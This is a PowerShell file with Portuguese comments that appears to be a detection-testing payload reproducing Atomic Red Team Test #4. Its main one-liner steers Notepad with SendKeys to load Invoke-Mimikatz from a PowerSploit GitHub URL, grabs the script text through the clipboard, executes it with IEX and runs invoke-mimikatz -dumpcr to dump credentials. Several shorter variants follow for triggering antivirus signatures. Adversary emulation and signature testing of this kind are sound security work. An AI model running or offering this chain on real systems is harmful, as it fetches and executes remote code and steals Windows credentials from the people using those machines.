# ATOMIC TEST #4 - Mimikatz via PsSendKeys
# Este payload simula o Atomic Test #4 que executa Mimikatz usando técnicas de automação com PsSendKeys

# PAYLOAD PRINCIPAL - Comando completo do Atomic Test #4:
$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Variable _).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr

# VARIAÇÕES PARA TESTE:

# Variação 1: Apenas a parte do WScript.Shell
$wshell=New-Object -ComObject WScript.Shell; $wshell.SendKeys('mimikatz')

# Variação 2: Apenas SendKeys com mimikatz
$wshell.SendKeys('invoke-mimikatz -dumpcr')

# Variação 3: AppActivate com Notepad
$wshell.AppActivate('Notepad'); $wshell.SendKeys('mimikatz')

# Variação 4: Simulação simplificada do PsSendKeys
New-Object -ComObject WScript.Shell | ForEach { $_.SendKeys('mimikatz'); $_.AppActivate('notepad') }

# Variação 5: Comando com Windows.Forms (outra parte da técnica)
[System.Windows.Forms.SendKeys]::SendWait('invoke-mimikatz')

# COMANDOS MAIS SIMPLES PARA TESTE RÁPIDO:

# Teste simples 1:
WScript.Shell

# Teste simples 2:
SendKeys mimikatz

# Teste simples 3:
AppActivate Notepad

# Teste simples 4 (vai pegar múltiplas signatures):
$wshell=New-Object -ComObject WScript.Shell; $wshell.SendKeys('invoke-mimikatz -dumpcr'); $wshell.AppActivate('Notepad')
